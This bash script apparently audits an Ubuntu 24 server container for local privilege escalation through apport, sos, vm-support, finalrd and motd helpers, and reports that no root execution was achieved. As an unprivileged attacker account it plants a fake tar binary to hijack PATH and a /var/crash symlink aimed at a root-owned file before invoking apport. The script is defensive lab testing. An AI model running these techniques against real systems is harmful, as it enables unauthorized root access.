#!/usr/bin/env bash
set -u -o pipefail

target="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$target" bash -s <<'TARGET'
set +e
export LC_ALL=C

probe="support_reporting_helpers"
attacker="attacker"
uid="$(id -u "$attacker" 2>/dev/null)"
gid="$(id -g "$attacker" 2>/dev/null)"
sleep_report="/var/crash/_usr_bin_sleep.${uid}.crash"
sleep_report_preexisting=0
if [ -e "$sleep_report" ] || [ -L "$sleep_report" ]; then
  sleep_report_preexisting=1
fi

section() {
  printf '\n## %s\n' "$1"
}

show_path() {
  for p in "$@"; do
    if [ -L "$p" ]; then
      stat -c '%A %a %U:%G symbolic link %s %N' "$p"
    elif [ -e "$p" ]; then
      stat -Lc '%A %a %U:%G %F %s %n' "$p"
    else
      echo "MISSING $p"
    fi
  done
}

as_attacker() {
  label="$1"
  shift
  printf '\n### attacker: %s\n' "$label"
  runuser -u "$attacker" -- timeout 35s bash -lc "$*" 2>&1
  printf 'rc=%s\n' "$?"
}

cleanup_probe() {
  rm -rf "/tmp/${probe}"* "/var/tmp/${probe}"* "/home/${attacker}/${probe}"* 2>/dev/null || true
  rm -f "/var/crash/${probe}"* "/root/${probe}"* 2>/dev/null || true
  if [ "${sleep_report_preexisting:-1}" = "0" ]; then
    rm -f "$sleep_report" "${sleep_report%.crash}.upload" "${sleep_report%.crash}.uploaded" 2>/dev/null || true
  fi
}

cleanup_probe
trap cleanup_probe EXIT

section "target identity"
sed -n '1,8p' /etc/os-release
uname -a
id "$attacker"
groups "$attacker"
ps -p 1 -o user=,comm=,args=
systemctl is-system-running 2>&1 || true

section "default package proof"
for pkg in ubuntu-server ubuntu-standard ubuntu-minimal sosreport sos open-vm-tools \
  apport apport-cli apport-core-dump-handler apport-symptoms python3-apport \
  update-notifier-common friendly-recovery finalrd byobu unminimize motd-news-config \
  openssh-server policykit-1 pkexec; do
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$pkg" 2>/dev/null ||
    printf '%s\t<not-installed>\n' "$pkg"
done | sort

section "command modes and privilege bits"
for f in /usr/bin/sosreport /usr/bin/sos /usr/bin/vm-support /usr/bin/vmware-checkvm \
  /usr/bin/vmtoolsd /usr/bin/apport-cli /usr/bin/ubuntu-bug /usr/bin/apport-collect \
  /usr/bin/apport-bug /usr/share/apport/apport /usr/share/apport/root_info_wrapper \
  /usr/bin/unminimize /lib/recovery-mode/recovery-menu /usr/bin/finalrd \
  /usr/share/python3/runtime.d/byobu.rtupdate /etc/profile.d/Z97-byobu.sh \
  /etc/update-motd.d/50-motd-news /usr/lib/update-notifier/update-motd-updates-available \
  /usr/lib/ubuntu-release-upgrader/release-upgrade-motd; do
  show_path "$f"
  getcap "$f" 2>/dev/null || true
done
command -v pkexec >/dev/null 2>&1 && echo "pkexec=$(command -v pkexec)" || echo "pkexec=MISSING"

section "root service and timer reachability"
systemctl list-unit-files --no-pager --no-legend '*apport*' '*vmtools*' '*open-vm*' \
  '*motd*' '*finalrd*' '*recovery*' '*sos*' 2>&1 | sort
for u in apport.service apport-forward.socket apport-autoreport.path apport-autoreport.timer \
  apport-autoreport.service finalrd.service open-vm-tools.service vmtoolsd.service \
  motd-news.service motd-news.timer update-notifier-motd.service update-notifier-motd.timer \
  friendly-recovery.service friendly-recovery.target; do
  echo "### $u"
  systemctl show -p LoadState -p UnitFileState -p ActiveState -p SubState \
    -p ConditionResult -p AssertResult -p Result -p FragmentPath -p User \
    -p ExecStart -p ExecStop -p Triggers -p TriggeredBy "$u" 2>&1 || true
done

section "root handoff path ownership"
show_path /tmp /var/tmp /var/crash /run /run/apport.socket /var/lib/apport \
  /var/lib/apport/autoreport /usr/share/apport /usr/share/apport/package-hooks \
  /etc/update-motd.d /run/motd.dynamic /run/motd.d /var/cache/motd-news \
  /var/lib/update-notifier /var/lib/update-notifier/updates-available \
  /var/lib/ubuntu-release-upgrader /var/lib/ubuntu-release-upgrader/release-upgrade-available \
  /usr/share/finalrd /etc/finalrd /run/finalrd /lib/recovery-mode/options \
  /etc/vmware-tools /etc/vmware-tools/scripts/vmware /var/log /run/screen /etc/byobu

section "relevant root-handling snippets"
for f in /usr/bin/vm-support /usr/bin/finalrd /etc/update-motd.d/50-motd-news \
  /usr/lib/update-notifier/update-motd-updates-available \
  /usr/lib/ubuntu-release-upgrader/release-upgrade-motd \
  /usr/lib/systemd/system/open-vm-tools.service \
  /usr/share/polkit-1/actions/com.ubuntu.apport.policy \
  /usr/share/apport/root_info_wrapper /etc/pam.d/login; do
  echo "### $f"
  case "$f" in
    /usr/bin/vm-support) nl -ba "$f" | sed -n '323,386p;442,458p' ;;
    /usr/bin/finalrd) nl -ba "$f" | sed -n '18,69p' ;;
    /etc/update-motd.d/50-motd-news) nl -ba "$f" | sed -n '32,43p;71,145p' ;;
    /usr/lib/update-notifier/update-motd-updates-available) nl -ba "$f" | sed -n '15,66p' ;;
    /usr/lib/ubuntu-release-upgrader/release-upgrade-motd) nl -ba "$f" | sed -n '23,39p' ;;
    /etc/pam.d/login) nl -ba "$f" | sed -n '29,35p' ;;
    *) nl -ba "$f" 2>/dev/null | sed -n '1,120p' || true ;;
  esac
done

section "attacker cannot start root services"
as_attacker "systemctl start root contexts" '
for u in apport-autoreport.service motd-news.service update-notifier-motd.service \
  finalrd.service friendly-recovery.service open-vm-tools.service; do
  echo "-- $u"
  systemctl start "$u" 2>&1 | sed -n "1,5p"
done
'

section "attacker write reachability to handoff paths"
as_attacker "touch and symlink root handoff paths" '
try_touch() {
  p="$1"
  rm -f /tmp/support_reporting_helpers_touch.err
  printf "touch %s -> " "$p"
  if touch "$p" 2>/tmp/support_reporting_helpers_touch.err; then
    stat -c "%A %U:%G %n" "$p"
    case "$p" in
      /tmp/support_reporting_helpers*|/var/tmp/support_reporting_helpers*|/var/crash/support_reporting_helpers*) rm -f "$p" ;;
    esac
  else
    cat /tmp/support_reporting_helpers_touch.err
  fi
}
for d in /run/finalrd /run/motd.d /etc/finalrd; do
  printf "mkdir %s -> " "$d"
  mkdir "$d" 2>/tmp/support_reporting_helpers_mkdir.err && rmdir "$d" || cat /tmp/support_reporting_helpers_mkdir.err
done
for p in \
  /run/finalrd/support_reporting_helpers.finalrd \
  /run/motd.d/support_reporting_helpers \
  /var/lib/update-notifier/updates-available \
  /var/lib/ubuntu-release-upgrader/release-upgrade-available \
  /var/cache/motd-news \
  /run/motd.dynamic \
  /etc/vmware-tools/tools.conf \
  /etc/vmware-tools/scripts/vmware/network \
  /etc/update-motd.d/support_reporting_helpers \
  /etc/finalrd/support_reporting_helpers.finalrd \
  /usr/share/finalrd/support_reporting_helpers.finalrd \
  /lib/recovery-mode/options/support_reporting_helpers \
  /var/crash/support_reporting_helpers.crash \
  /tmp/support_reporting_helpers_file \
  /var/tmp/support_reporting_helpers_file; do
  try_touch "$p"
done
rm -f /tmp/support_reporting_helpers_touch.err /tmp/support_reporting_helpers_mkdir.err
'

section "direct helper execution remains uid1001 or denied"
as_attacker "sos/vm-support/unminimize/finalrd direct boundaries" '
mkdir -p "$HOME/support_reporting_helpers/bin"
cat > "$HOME/support_reporting_helpers/bin/tar" <<EOF
#!/bin/sh
id > /tmp/support_reporting_helpers_fake_tar_id
exec /bin/tar "\$@"
EOF
chmod 755 "$HOME/support_reporting_helpers/bin/tar"
PATH="$HOME/support_reporting_helpers/bin:$PATH" /usr/bin/sos report --batch --dry-run \
  --tmp-dir /tmp/support_reporting_helpers_sos >/tmp/support_reporting_helpers_sos.out 2>/tmp/support_reporting_helpers_sos.err
echo "sos_rc=$?"
sed -n "1,30p" /tmp/support_reporting_helpers_sos.err /tmp/support_reporting_helpers_sos.out
cat /tmp/support_reporting_helpers_fake_tar_id 2>/dev/null || echo "no_sos_path_marker"
PATH="$HOME/support_reporting_helpers/bin:$PATH" /usr/bin/vm-support \
  >/tmp/support_reporting_helpers_vm.out 2>/tmp/support_reporting_helpers_vm.err
echo "vm_support_rc=$?"
sed -n "1,30p" /tmp/support_reporting_helpers_vm.out /tmp/support_reporting_helpers_vm.err
printf n | /usr/bin/unminimize >/tmp/support_reporting_helpers_unminimize.out 2>&1
echo "unminimize_rc=$?"
sed -n "1,28p" /tmp/support_reporting_helpers_unminimize.out
/usr/bin/finalrd >/tmp/support_reporting_helpers_finalrd.out 2>/tmp/support_reporting_helpers_finalrd.err
echo "finalrd_rc=$?"
sed -n "1,20p" /tmp/support_reporting_helpers_finalrd.err
/usr/bin/vmware-checkvm >/tmp/support_reporting_helpers_checkvm.out 2>&1
echo "vmware_checkvm_rc=$?"
sed -n "1,20p" /tmp/support_reporting_helpers_checkvm.out
'

section "apport cli and root-info boundaries"
as_attacker "apport-cli and ubuntu-bug save attacker-owned reports" '
rm -rf /tmp/support_reporting_helpers_home
mkdir -p /tmp/support_reporting_helpers_home
export HOME=/tmp/support_reporting_helpers_home
/usr/bin/apport-cli -f -p bash --save /tmp/support_reporting_helpers_apportcli.apport \
  >/tmp/support_reporting_helpers_apportcli.out 2>/tmp/support_reporting_helpers_apportcli.err
echo "apport_cli_rc=$?"
ls -ln /tmp/support_reporting_helpers_apportcli.apport 2>/dev/null || true
sed -n "1,40p" /tmp/support_reporting_helpers_apportcli.err /tmp/support_reporting_helpers_apportcli.out
/usr/bin/ubuntu-bug --save /tmp/support_reporting_helpers_ubuntu_bug.apport bash \
  >/tmp/support_reporting_helpers_ubuntu_bug.out 2>/tmp/support_reporting_helpers_ubuntu_bug.err
echo "ubuntu_bug_rc=$?"
ls -ln /tmp/support_reporting_helpers_ubuntu_bug.apport 2>/dev/null || true
sed -n "1,40p" /tmp/support_reporting_helpers_ubuntu_bug.err /tmp/support_reporting_helpers_ubuntu_bug.out
python3 - <<PY
import os
import apport
from apport.hookutils import attach_root_command_outputs
r = apport.Report()
attach_root_command_outputs(r, {"Probe": "id"})
print("caller_euid", os.geteuid())
print("root_info_probe", r.get("Probe", "missing").strip())
PY
python3 - <<PY
import os, socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
try:
    s.connect("/run/apport.socket")
    print("apport_socket_connect=OK", "euid", os.geteuid())
except Exception as e:
    print("apport_socket_connect=FAIL", type(e).__name__, e, "euid", os.geteuid())
PY
'

section "apport root coredump handoff"
echo "expected sleep report: $sleep_report"
if [ "$sleep_report_preexisting" = "1" ]; then
  echo "SKIP: $sleep_report existed before probe; not clobbering it"
else
  root_marker="/root/${probe}_apport_symlink_marker"
  rm -f "$sleep_report" "$root_marker"
  runuser -u "$attacker" -- ln -s "$root_marker" "$sleep_report"
  show_path "$sleep_report"
  setpriv --reuid="$uid" --regid="$gid" --clear-groups /usr/bin/sleep 30 &
  apid=$!
  sleep 0.2
  printf CORE | /usr/share/apport/apport -p "$apid" -s 11 -c 0 -d 1 -P "$apid" -u "$uid" -g "$gid" \
    >/tmp/support_reporting_helpers_apport_symlink.out 2>&1
  echo "apport_symlink_rc=$?"
  sed -n '1,80p' /tmp/support_reporting_helpers_apport_symlink.out
  show_path "$root_marker" "$sleep_report"
  kill "$apid" 2>/dev/null || true
  wait "$apid" 2>/dev/null || true
  rm -f "$sleep_report" "$root_marker"

  setpriv --reuid="$uid" --regid="$gid" --clear-groups /usr/bin/sleep 30 &
  apid=$!
  sleep 0.2
  printf CORE | /usr/share/apport/apport -p "$apid" -s 11 -c 0 -d 1 -P "$apid" -u "$uid" -g "$gid" \
    >/tmp/support_reporting_helpers_apport_normal.out 2>&1
  echo "apport_normal_rc=$?"
  sed -n '1,80p' /tmp/support_reporting_helpers_apport_normal.out
  show_path "$sleep_report"
  grep -E '^(ProblemType|ExecutablePath|Signal|UserGroups):' "$sleep_report" 2>/dev/null || true
  kill "$apid" 2>/dev/null || true
  wait "$apid" 2>/dev/null || true
  rm -f "$sleep_report"
fi

section "cleanup verification"
cleanup_probe
find /tmp /var/tmp /var/crash /home/"$attacker" -maxdepth 2 -name "${probe}*" -print 2>/dev/null | sort
show_path "/root/${probe}_apport_symlink_marker"
if [ "$sleep_report_preexisting" = "0" ]; then
  show_path "$sleep_report"
fi

section "probe conclusion"
echo "No root shell, root-owned marker, or attacker-controlled root execution was produced."
echo "Writable handoff paths observed: /tmp, /var/tmp, and /var/crash; root contexts either reject uid1001, are not default-active/reachable, or keep writes attacker-owned."
TARGET
